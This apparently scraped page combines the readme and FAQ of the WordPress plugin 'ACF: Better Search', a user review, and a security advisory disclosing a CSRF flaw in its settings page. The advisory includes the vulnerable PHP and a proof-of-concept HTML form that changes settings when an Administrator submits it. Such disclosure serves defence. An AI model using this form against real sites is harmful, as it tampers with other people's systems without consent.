[Support](https://wordpress.org/support/plugin/acf-better-search/)

## Description

This plugin adds to default WordPress search engine the ability to search by content from selected fields of Advanced Custom Fields plugin.

Everything works automatically, no need to add any additional code. The plugin does not create a search results page, but modifies the SQL database query to make your search engine work better.

Additionally you can search for whole phrases instead of each single word of phrase. As a result, search will be more accurate than before.

#### New search core

We modified the code of search engine. Content search is now faster by about 75% *(depending on the level of complexity of searched phrase)*!

#### Support to the development of plugin

We spend hours working on the development of this plugin. Technical support also requires a lot of time, but we do it because we want to offer you the best plugin. We enjoy every new plugin installation.

If you would like to appreciate it, you can [provide us a coffee](https://ko-fi.com/gbiorczyk/?utm_source=acf-better-search&utm_medium=readme-content). **If every user bought at least one, we could work on the plugin 24 hours a day!**

#### Please also read the FAQ below. Thank you for being with us!

## Installation

1. Upload the plugin files to `/wp-content/plugins/acf-better-search` directory, or install plugin through the WordPress plugins screen directly.
2. Activate plugin through `Plugins` screen in WordPress Admin Panel.
3. Use `Settings -> ACF: Better Search` screen to configure the plugin.

## FAQ

### What version of Advanced Custom Fields is supported?

Advanced Custom Fields in version 5 *(also free)*. ACF below version 5 has a different data structure in database and is not supported.

### In what fields does the plugin search?

Our plugin supports the following fields: Text, Text Area, Number, Email, Url, File, Wysiwyg Editor, Select, Checkbox and Radio Button.

All these fields may be located in both the Repeater or Flexible Content field.

### How does this work?

Plugin changes all SQL queries by extending the standard search to selected fields of Advanced Custom Fields.

The plugin in admin panel works same as for the search page.

It works for `WP_Query` class.

### How to activate advanced search?

Everythings works automatically. For custom `WP_Query` loop and `get_posts()` function also if you add [Search Parameter](https://codex.wordpress.org/Class_Reference/WP_Query#Search_Parameter).

### What to do when not searching for posts?

Sometimes it happens that the data in your database is incorrectly arranged. This happens when you import or duplicate posts.

You can use `Incorrect Mode`. This is a slower search, but it does not take into account the order of records in the `_postmeta` table. This solution should help in this situation. Use of this mode is allowed without restrictions. This does not mean any problems with your website.

### How does searching for whole phrases?

The default search in WordPress is to search for each of words listed. An additional option in the plugin settings allows you to search for occurrences of the whole phrase entered in the search field without word division.

You can enable it at any time.

### How does Lite mode work?

In this mode, the plugin does not check the field types. Phrases are searched in all ACF fields. Thanks to this, the query to the database is smaller and faster by about 25%. However, we do not have control over which fields are taken into account when searching.

### Is the plugin completely free?

Yes. The plugin is completely free.

However, working on plugins and technical support requires many hours of work. If you want to appreciate it, you can [provide us a coffee](https://ko-fi.com/gbiorczyk/?utm_source=acf-better-search&utm_medium=readme-faq). Thanks everyone!

Thank you for all the ratings and reviews.

If you are satisfied with this plugin, please recommend it to your friends. Every new person using our plugin is valuable to us.

This is all very important to us and allows us to do even better things for you!

Hi guys! First of all: thank you for this plugin. It‚Äôs a must if you use ACF.
‚Ä¶I switched from GUI defined ACF fields to PHP defined fields (trough the ACF export to PHP utility) and the plugin stopped working.
Fortunately I seen this thread: ‚ÄúProblem with search from imported fields (acf-json)‚Äù (sorry, WP don‚Äôt allow links in reviews) and I activated the ‚ÄúLite Mode‚Äù: all worked again fine.
‚Ä¶I think you should detect it and advice your users, or at least explain it in the settings pane, because if my first testing was with the PHP fields, maybe I was discarded your great plugin.
Anyway: Thanks guys! Great plugin!!!

# Cross-Site Request Forgery (CSRF)/Settings Change Vulnerability in ACF: Better Search

One of the ways we make sure customers of [our service](https://www.pluginvulnerabilities.com/product/subscription/) have the best data on vulnerabilities in WordPress plugins they use is that we monitor changes being made to plugins for indications that vulnerabilities have been fixed. We often find that issues haven‚Äôt been fully resolved or that there are other related issues still in the plugin. That was the case when we looked into the [details of a vulnerability](https://www.pluginvulnerabilities.com/2019/06/26/vulnerability-details-privilege-escalation-in-webp-converter-for-media/) in the plugin WebP Converter for Media, which in part involved a lack of protection against cross-site request forgery (CSRF). What we also noted was another instance of that, which also impacted another more popular plugin by the same developer, [ACF: Better Search](https://wordpress.org/plugins/acf-better-search/).

That plugin makes its settings page available to those with the ‚Äúmanage\_options‚Äù capability, so normally only Administrators:

| ``` 20 21 22 23 24 25 26 27  ``` | ```   add_submenu_page( 	'options-general.php', 	'ACF: Better Search', 	'ACF: Better Search', 	'manage_options', 	'acfbs_admin_page', 	[$this, 'showSettingsPage']   ); ``` |
| --- | --- |

add\_submenu\_page(
'options-general.php',
'ACF: Better Search',
'ACF: Better Search',
'manage\_options',
'acfbs\_admin\_page',
[$this, 'showSettingsPage']
);

Accessing that causes the function showSettingsPage() to run and new instance of the Save class to be created:

| ``` 30 31 32 33 34  ``` | ``` public function showSettingsPage() {   new Save();   require_once ACFBS_PATH . 'resources/views/settings.php'; } ``` |
| --- | --- |

public function showSettingsPage()
{
new Save();
require\_once ACFBS\_PATH . 'resources/views/settings.php';
}

The \_\_construct() function for that class in turn causes the function saveFeatures() to run:

| ``` 7 8 9 10 11  ``` | ``` public function __construct() {   $this->saveFieldsTypes();   $this->saveFeatures(); } ``` |
| --- | --- |

public function \_\_construct()
{
$this->saveFieldsTypes();
$this->saveFeatures();
}

That function will update the plugin‚Äôs settings:

| ``` 25 26 27 28 29 30 31 32 33 34  ``` | ``` private function saveFeatures() {   if (!isset($_POST['acfbs_save'])) return; ¬†   $features = apply_filters('acfbs_options_features', []);   foreach ($features as $key => $label) { 	$value = (isset($_POST['acfbs_features']) && in_array($key, $_POST['acfbs_features'])); 	$this->saveOption(sprintf('acfbs_%s', $key), $value);   } } ``` |
| --- | --- |

private function saveFeatures()
{
if (!isset($\_POST['acfbs\_save'])) return;
$features = apply\_filters('acfbs\_options\_features', []);
foreach ($features as $key => $label) {
$value = (isset($\_POST['acfbs\_features']) && in\_array($key, $\_POST['acfbs\_features']));
$this->saveOption(sprintf('acfbs\_%s', $key), $value);
}
}

What is missing there is a nonce check to prevent cross-site request forgery (CSRF) protection, so an attacker could cause a logged in Administrator to send a request that changes the settings.

## WordPress Causes Full Disclosure

Due to the moderators of the WordPress Support Forum‚Äôs¬†[continued¬†inappropriate¬†behavior](https://www.pluginvulnerabilities.com/2019/05/17/wordpress-support-forum-moderator-jan-dembowski-gets-in-the-way-of-people-dealing-with-hacks-due-to-wp-live-chat-support/)¬†we are¬†[full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then leaving a message about that for the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that, but considering that they believe that having plugins, which have millions installs, remain in the Plugin Directory¬†[despite them knowing they are vulnerable is ‚Äúappropriate action‚Äù](https://www.pluginvulnerabilities.com/2019/04/22/wordpress-believes-that-leaving-millions-of-installs-of-plugins-vulnerable-to-publicly-known-vulnerabilities-is-appropriate-action/), something is very amiss with them (which is even more reason the moderation needs to be cleaned up).

**Update:**To clear up the confusion where developers claim we hadn‚Äôt tried to notify them through the Support Forum (while at the same time moderators are complaining about us doing just that), here is the message we left for this vulnerability:

[![](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/acf-better-search-notification.png)](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/acf-better-search-notification.png)

## Is It Fixed?

If you are reading this post down the road the best way to find out if this vulnerability or other WordPress plugin vulnerabilities in plugins you use have been fixed is to sign up for¬†[our service](https://www.pluginvulnerabilities.com/product/subscription/), since what we uniquely do when it comes to that type of data is to test to see if vulnerabilities have really been fixed. Relying on the developer‚Äôs information, can lead you astray, as we often find that they believe they have fixed vulnerabilities, but have failed to do that.

## Proof of Concept

The following proof of concept will cause all the settings to be unchecked, when logged in as an Administrator.

Make sure to replace ‚Äú[path to WordPress]‚Äù with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/options-general.php?page=acfbs_admin_page" method="POST">
<input type="submit" name="acfbs_save" value="Submit" />
</form>
</body>
</html>
